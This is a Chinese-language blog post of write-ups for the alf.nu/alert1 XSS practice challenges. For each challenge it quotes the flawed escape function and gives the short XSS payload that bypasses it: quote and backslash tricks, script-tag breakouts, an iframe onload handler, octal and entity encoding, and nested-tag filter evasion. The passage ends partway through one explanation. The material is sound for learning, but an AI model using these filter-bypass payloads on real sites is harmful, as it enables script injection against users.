1:HL["/_next/static/media/2aaf0723e720e8b9-s.p.woff2",{"as":"font","type":"font/woff2"}]
2:HL["/_next/static/css/40db9a3d7b10e1fc.css",{"as":"style"}]
3:HL["/_next/static/css/6c438bdd1a6b11fe.css",{"as":"style"}]
0:[[["",{"children":["posts",{"children":[["slug","xss-practices","c"],{"children":["__PAGE__?{\"slug\":[\"xss-practices\"]}",{}]}]}]},"$undefined","$undefined",true],"$L4",[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/40db9a3d7b10e1fc.css","precedence":"next"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/6c438bdd1a6b11fe.css","precedence":"next"}]],["$L5",["$","meta",null,{"name":"next-size-adjust"}]]]]]
6:I{"id":"350","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"ThemeProvider","async":false}
7:I{"id":"414","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"","async":false}
8:I{"id":"9544","chunks":["272:static/chunks/webpack-3256771b4b5faaf4.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
9:I{"id":"99","chunks":["272:static/chunks/webpack-3256771b4b5faaf4.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
b:I{"id":"1234","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-a99377e10d68f0d5.js"],"name":"Analytics","async":false}
4:[["$","html",null,{"lang":"en","children":["$","body",null,{"className":"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4","children":["$","$L6",null,{"attribute":"class","defaultTheme":"system","enableSystem":true,"children":[["$","div",null,{"className":"my-max mx-auto py-10 px-4","children":[["$","header",null,{"children":["$","div",null,{"className":"my-flex","children":[["$","div",null,{"className":"flex space-x-6 ","children":["$","p",null,{"className":"blog-name font-medium text-2xl","children":"Always Exploring"}]}],["$","nav",null,{"className":"nav-ml text-sm font-medium space-x-6","children":[["$","$L7",null,{"href":"/","children":"Home"}],["$","$L7",null,{"href":"/about","children":"About"}]]}]]}]}],["$","main",null,{"children":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L8",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children",["slug","xss-practices","c"],"children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L9",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$La",null],"segment":"__PAGE__?{\"slug\":[\"xss-practices\"]}"},"styles":[]}],"segment":["slug","xss-practices","c"]},"styles":[]}],"segment":"posts"},"styles":[]}]}]]}],["$","$Lb",null,{}]]}]}]}],null]
5:[[["$","meta",null,{"charSet":"utf-8"}],["$","title",null,{"children":"XSS练习:alf.nu/alert1 Write-ups"}],null,null,null,null,null,null,null,null,null,["$","meta",null,{"name":"viewport","content":"width=device-width, initial-scale=1"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"any"}]],[],null]]
c:I{"id":"1753","chunks":["46:static/chunks/46-79f3cb62e0a9762a.js","49:static/chunks/app/posts/[...slug]/page-403c6a1364df7930.js"],"name":"","async":false}
a:[["$","$Lc",null,{}],["$","article",null,{"className":"py-6 prose post-prose dark:prose-invert","children":[["$","div",null,{"className":"post-title","children":"XSS练习:alf.nu/alert1 Write-ups"}],["$","time",null,{"dateTime":"2018-01-29T17:26:26.000Z","className":"post-time","children":"January 29, 2018"}],"$undefined",["$","div",null,{"className":"js-toc-content","children":[["$","h1",null,{"id":"前言","children":"前言"}],"\n",["$","p",null,{"children":["这些天在",["$","a",null,{"href":"https://alf.nu/alert1","children":"alf.nu/alert1"}],"上做了XSS练习题，目前大部分做出来了，但有些题目并不是最优解。还剩下2道题没有做出（Fruit3, Qunie），在此做个记录。欢迎大家交流。"]}],"\n",["$","h1",null,{"id":"warmup","children":"Warmup"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-javascript","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}],"+s+",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这题对输入没有限制，只要闭合掉console.log即可。\nsolution(12 chars): ",["$","code",null,{"children":"\");alert(1,\""}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"adobe","children":"Adobe"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  s = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\"/g"}],", ",["$","span",null,{"className":"hljs-string","children":"'\\\\\"'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'\");</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这题escape将输入的引号",["$","code",null,{"children":"\""}],"转换为了",["$","code",null,{"children":"\\\\\""}],"，使得引号变成了字面量，上一题的方法无效了。不过如果输入为",["$","code",null,{"children":"\\\""}],"，那么就会转换为",["$","code",null,{"children":"\\\\\\\""}],"，这个时候，本来是转义引号的，但变成了转义反斜杆了，从而引号可以逃脱转义了。\nsolution(14 chars): ",["$","code",null,{"children":"\\\");alert(1)//"}]]}],"\n",["$","h1",null,{"id":"json","children":"JSON"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  s = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(s);\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log('"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"');</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这题对输入的字符串用了",["$","code",null,{"children":"JSON.stringify()"}],"(",["$","a",null,{"href":"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify","children":"相关介绍"}],")来处理字符串。简单来说，就是过滤了",["$","code",null,{"children":"\\"}],",",["$","code",null,{"children":"\""}],"等字符，分别转化为",["$","code",null,{"children":"\\\\"}],",",["$","code",null,{"children":"\\\""}],"等，但没有过滤",["$","code",null,{"children":"<"}],",",["$","code",null,{"children":">"}],",",["$","code",null,{"children":"/"}],"字符，这就够用了。既然闭合不了",["$","code",null,{"children":"log"}],"函数，那就闭合",["$","code",null,{"children":"script"}],"标签吧\nsolution(27 chars): ",["$","code",null,{"children":"</script><script>alert(1)//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"javascript","children":"JavaScript"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," url = ",["$","span",null,{"className":"hljs-string","children":"'javascript:console.log('"}]," + ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(s) + ",["$","span",null,{"className":"hljs-string","children":"')'"}],";\n  ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(url);\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," a = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'a'"}],");\n  a.",["$","span",null,{"className":"hljs-property","children":"href"}]," = url;\n  ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-property","children":"body"}],".",["$","span",null,{"className":"hljs-title function_","children":"appendChild"}],"(a);\n  a.",["$","span",null,{"className":"hljs-title function_","children":"click"}],"();\n}\n"]}]}],"\n",["$","p",null,{"children":["同样因为",["$","code",null,{"children":"JSON.stringify()"}],"的原因没办法用直接用",["$","code",null,{"children":"\""}],"，但是由于这次注入的地方是url，所以可以用URL编码的办法讲",["$","code",null,{"children":"\""}],"转换为",["$","code",null,{"children":"%22"}],"。\nsolution(15 chars): ",["$","code",null,{"children":"%22);alert(1)//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"markdown","children":"Markdown"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," text = s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/</g"}],", ",["$","span",null,{"className":"hljs-string","children":"'&lt;'"}],").",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\"/g"}],", ",["$","span",null,{"className":"hljs-string","children":"'&quot;'"}],");\n  ",["$","span",null,{"className":"hljs-comment","children":"// URLs"}],"\n  text = text.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/(http:\\/\\/\\S+)/g"}],", ",["$","span",null,{"className":"hljs-string","children":"'<a href=\"$1\">$1</a>'"}],");\n  ",["$","span",null,{"className":"hljs-comment","children":"// [[img123|Description]]"}],"\n  text = text.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\\[\\[(\\w+)\\|(.+?)\\]\\]/g"}],", ",["$","span",null,{"className":"hljs-string","children":"'<img alt=\"$2\" src=\"$1.gif\">'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," text;\n}\n"]}]}],"\n",["$","p",null,{"children":"首先分析这题的处理方法"}],"\n",["$","ol",null,{"children":["\n",["$","li",null,{"children":["首先，对于任何输入，先过滤掉",["$","code",null,{"children":"<"}],"和",["$","code",null,{"children":"\""}],"变为实体编码",["$","code",null,{"children":"&lt"}],"和",["$","code",null,{"children":"&quot"}],"。"]}],"\n",["$","li",null,{"children":["如果字符串中有包含",["$","code",null,{"children":"http://"}],"开头的字符串，例如",["$","code",null,{"children":"http://xiao.world"}],"则变为",["$","code",null,{"children":"<a href=\"http://xiao.world\">http://xiao.world</a>"}]]}],"\n",["$","li",null,{"children":["如果字符串中包含",["$","code",null,{"children":"[[img_src|img_alt]]"}],"格式的字符串，则变为",["$","code",null,{"children":"<img alt=\"img_alt\" src=\"this_src.git\">"}]]}],"\n",["$","li",null,{"children":"返回字符串"}],"\n"]}],"\n",["$","p",null,{"children":["对于这个题目，因为尖括号和引号都被过滤了，所以要从这里入手会比较困难。但是可以利用第二点和第三点的规则来做突破口。为甚么这么说呢？既然自己没办法闭合属性的引号或者标签，但是规则二转换之后会带有引号，利用这个引号，就可以闭合掉规则三转换之后的img标签的alt属性了。\n输入：",["$","code",null,{"children":"[[a|http://onerror='alert(1)]]"}],"\n经过规则一转换后:",["$","code",null,{"children":"[[a|<a href=\"http://onerror='alert(1)']]\">http://onerror='alert(1)']]</a>"}],"\n再经过规则二转换： ",["$","code",null,{"children":"<img alt=\"<a href=\"http://onerror='alert(1)'\" src=\"a.gif\">\">http://onerror='alert(1)']]</a>"}],"\n感谢HTML语言松散的特性，以上即相当于: ",["$","code",null,{"children":"<img alt=\"<a href=\" http:=\"\" onerror=\"alert(1)\" \"=\"\" src=\"a.gif\">"}],"\n再精简一点，只看关键部分: ",["$","code",null,{"children":"<img alt=\"<a href=\" onerror=\"alert(1)\" src=\"a.git\">"}],"\n至此，大功告成😄。\nsolution(31 chars): ",["$","code",null,{"children":"[[a|http://onerror='alert(1)']]"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"dom","children":"DOM"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-comment","children":"// Slightly too lazy to make two input fields."}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"// Pass in something like \"TextNode#foo\""}],"\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," m = s.",["$","span",null,{"className":"hljs-title function_","children":"split"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/#/"}],");\n\n  ",["$","span",null,{"className":"hljs-comment","children":"// Only slightly contrived at this point."}],"\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," a = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'div'"}],");\n  a.",["$","span",null,{"className":"hljs-title function_","children":"appendChild"}],"(",["$","span",null,{"className":"hljs-variable language_","children":"document"}],"[",["$","span",null,{"className":"hljs-string","children":"'create'"}],"+m[",["$","span",null,{"className":"hljs-number","children":"0"}],"]].",["$","span",null,{"className":"hljs-title function_","children":"apply"}],"(",["$","span",null,{"className":"hljs-variable language_","children":"document"}],", m.",["$","span",null,{"className":"hljs-title function_","children":"slice"}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],")));\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," a.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["关键在于理解第八行的代码。\n如果输入为",["$","code",null,{"children":"Element#alert"}],"\n第八行为：",["$","code",null,{"children":"document[\"createElement\"].apply(document, \"alert\")"}],"\n相当于",["$","code",null,{"children":"document.createElement(\"alert\")"}],"\n这样只是创建了一个",["$","code",null,{"children":"<alert>"}],"标签，我们没有办法注入。所以查一下document有哪些create开头的方法，一下列出一些常用的："]}],"\n",["$","blockquote",null,{"children":["\n",["$","p",null,{"children":"createElement\ncreateTextNode\ncreateComment\ncreateAttribute\ncreateEvent"}],"\n"]}],"\n",["$","p",null,{"children":["这里看到有",["$","code",null,{"children":"createComment"}],"就令人特别开心。所以答案见下\nsolution(32 chars): ",["$","code",null,{"children":"Comment#><iframe onload=alert(1)"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"callback","children":"Callback"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-comment","children":"// Pass inn \"callback#userdata\""}],"\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," thing = s.",["$","span",null,{"className":"hljs-title function_","children":"split"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/#/"}],");\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (!",["$","span",null,{"className":"hljs-regexp","children":"/^[a-zA-Z\\[\\]']*$/"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(thing[",["$","span",null,{"className":"hljs-number","children":"0"}],"])) ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'Invalid callback'"}],";\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," obj = {",["$","span",null,{"className":"hljs-string","children":"'userdata'"}],": thing[",["$","span",null,{"className":"hljs-number","children":"1"}],"] };\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," json = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(obj).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/</g"}],", ",["$","span",null,{"className":"hljs-string","children":"'\\\\u003c'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"\"<script>\""}]," + thing[",["$","span",null,{"className":"hljs-number","children":"0"}],"] + ",["$","span",null,{"className":"hljs-string","children":"\"(\""}]," + json +",["$","span",null,{"className":"hljs-string","children":"\")</script>\""}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["随便输入点看看效果吧：",["$","code",null,{"children":"input1#input2"}],"\n输出: ",["$","code",null,{"children":"<script>input1({\"userdata\":\"input2\"})</script>"}],"\n因为input1有输入要求，但是input2可以为任意值，所以我们的注入可以放在input2，但是在input2之前有一堆奇奇怪怪的东西，最直接简单的办法就是用引号闭合掉他们就好了。所幸input1并没有把单引号过滤掉，所以答案就是\nsolution(15 chars): ",["$","code",null,{"children":"'#';alert(1);//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"skandia","children":"Skandia"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s.",["$","span",null,{"className":"hljs-title function_","children":"toUpperCase"}],"() + ",["$","span",null,{"className":"hljs-string","children":"'\")</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["题目真短，但心思没少花呀。\njs的方法名是大小写敏感的，如果把",["$","code",null,{"children":"alert"}],"变为了",["$","code",null,{"children":"ALERT"}],"，那就不行了。但是HTML标签名和属性名是不区分大小写的，所以我们可以闭合掉",["$","code",null,{"children":"<script>"}],"标签，然后自己注入标签，利用",["$","code",null,{"children":"onload"}],"属性出发",["$","code",null,{"children":"alert"}],"，但是有个问题就是",["$","code",null,{"children":"alert"}],"大小写怎么办呢？依我个人测试和理解(暂时未找到根据)，在属性值处使用实体编码的话，是可以自动解码的,其他地方则不行。所以，问题解决了。\nsolution(53 chars): ",["$","code",null,{"children":"</script><iframe onload=&#x61&#x6C&#x65&#x72&#x74(1)>"}],"\n但我这个解用了53个字符，并不是最短的，但是有人也有人做到了30多和40多的，我暂时也想不到什么办法。有知道的请告诉我一声，谢谢😄"]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"template","children":"Template"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"htmlEscape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/./g"}],", ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"x"}],") {\n       ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," { ",["$","span",null,{"className":"hljs-string","children":"'<'"}],": ",["$","span",null,{"className":"hljs-string","children":"'&lt;'"}],", ",["$","span",null,{"className":"hljs-string","children":"'>'"}],": ",["$","span",null,{"className":"hljs-string","children":"'&gt;'"}],", ",["$","span",null,{"className":"hljs-string","children":"'&'"}],": ",["$","span",null,{"className":"hljs-string","children":"'&amp;'"}],", ",["$","span",null,{"className":"hljs-string","children":"'\"'"}],": ",["$","span",null,{"className":"hljs-string","children":"'&quot;'"}],", ",["$","span",null,{"className":"hljs-string","children":"\"'\""}],": ",["$","span",null,{"className":"hljs-string","children":"'&#39;'"}]," }[x] || x;\n     });\n  }\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"expandTemplate"}],"(",["$","span",null,{"className":"hljs-params","children":"template, args"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," template.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(\n        ",["$","span",null,{"className":"hljs-regexp","children":"/{(\\w+)}/g"}],",\n        ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"_, n"}],") {\n           ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-title function_","children":"htmlEscape"}],"(args[n]);\n         });\n  }\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-title function_","children":"expandTemplate"}],"(\n    ",["$","span",null,{"className":"hljs-string","children":"\"                                                \\n\\\n      <h2>Hello, <span id=name></span>!</h2>         \\n\\\n      <script>                                       \\n\\\n         var v = document.getElementById('name');    \\n\\\n         v.innerHTML = '<a href=#>{name}</a>';       \\n\\\n      <\\/script>                                     \\n\\\n    \""}],",\n    { name : s }\n  );\n}\n"]}]}],"\n",["$","p",null,{"children":["简单来说，对输入字符串过滤掉尖括号，引号等，然后将处理完的字符串替换掉模板字符串中",["$","code",null,{"children":"{name}"}],"。但是百密一疏，字符串中可以用8进制或者16进制来表示字符。所以答案就出来了。",["$","code",null,{"children":"<"}],"对应的八进制是",["$","code",null,{"children":"\\74"}],"。\nsolution(27): ",["$","code",null,{"children":"\\74iframe onload=alert(1)//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"json-","children":"JSON ]["}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  s = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(s).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/<\\/script/gi"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log('"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"');</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这道题也挺有意思的。格式化之后再把",["$","code",null,{"children":"</script"}],"替换成空串。使用一点技巧就可以绕过了。\nsolution(35): ",["$","code",null,{"children":"</scr</scriptipt><script>alert(1)//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"callback-","children":"Callback ]["}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-comment","children":"// Pass inn \"callback#userdata\""}],"\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," thing = s.",["$","span",null,{"className":"hljs-title function_","children":"split"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/#/"}],");\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (!",["$","span",null,{"className":"hljs-regexp","children":"/^[a-zA-Z\\[\\]']*$/"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(thing[",["$","span",null,{"className":"hljs-number","children":"0"}],"])) ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'Invalid callback'"}],";\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," obj = {",["$","span",null,{"className":"hljs-string","children":"'userdata'"}],": thing[",["$","span",null,{"className":"hljs-number","children":"1"}],"] };\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," json = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(obj).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\\//g"}],", ",["$","span",null,{"className":"hljs-string","children":"'\\\\/'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"\"<script>\""}]," + thing[",["$","span",null,{"className":"hljs-number","children":"0"}],"] + ",["$","span",null,{"className":"hljs-string","children":"\"(\""}]," + json +",["$","span",null,{"className":"hljs-string","children":"\")</script>\""}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["和上面的题目",["$","a",null,{"href":"#Callback","children":"Callback"}],"一样，只是因为过滤了",["$","code",null,{"children":"/"}],"，不能用",["$","code",null,{"children":"//"}],"注释了而已，那就换一种注释方式吧\nsolution(16): ",["$","code",null,{"children":"'#';alert(1)<!--"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"skandia-","children":"Skandia ]["}],"\n",["$","pre",null,{"children":["$","code",null,{"children":"\nfunction escape(s) {\n  if (/[<>]/.test(s)) return '-';\n\n  return '<script>console.log(\"' + s.toUpperCase() + '\")</script>';\n}\n"}]}],"\n",["$","p",null,{"children":["首先考虑到可以闭合",["$","code",null,{"children":"script"}],"标签，但是这题过滤了尖括号，想到上一题",["$","a",null,{"href":"#Template","children":"Template"}],"的方法，即用十六进制或八进制来表示尖括号，但是经过测试发现，在这题并不管用。想不明白为甚么，但是测试结果是：字符串的",["$","code",null,{"children":"replace"}],"方法是认不出十六进或者八进制代表的字符的，但是",["$","code",null,{"children":"test"}],"方法却可以。所以上一题Template用的过滤方法replace过滤",["$","code",null,{"children":"<"}],"括号时，由于我们用了",["$","code",null,{"children":"\\74"}],"来表示，而replace方法并不认识它，所以绕过了过滤。但是这题用了",["$","code",null,{"children":"test"}],"方法，面对同样的情况，它知道",["$","code",null,{"children":"\\74"}],"即代表着",["$","code",null,{"children":"<"}],"，所以这个方法无效了。\n既然不能闭合",["$","code",null,{"children":"script"}],"，那就可以考虑闭合",["$","code",null,{"children":"log"}],"，应该注入的payload是",["$","code",null,{"children":"\");alert(1)//"}],"，但是alert转为大写就不行了。此时最简单粗暴的方法是直接用",["$","a",null,{"href":"http://utf-8.jp/public/jjencode.html","children":"jjencode"}],"( an online non-alphanumeric encoder)。将",["$","code",null,{"children":"alert(1)"}],"用jjencode encode得到的转码后的结果，由于结果太长了，所以用jjencode代表，则\nsolutioon(538)为: ",["$","code",null,{"children":"\");jjencode//"}]]}],"\n",["$","p",null,{"children":["但是538个字符还是太长了。在",["$","a",null,{"href":"http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/","children":"pwntester"}],"的博客里看到了一个更好的办法。\n首先应该注入的payload是",["$","code",null,{"children":"\"+alert(1))//\""}],"\n但是要想办法用相等效果的语句替换掉alert(1)。\n在博客上看到一个方法也可以触发alert(1)"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs 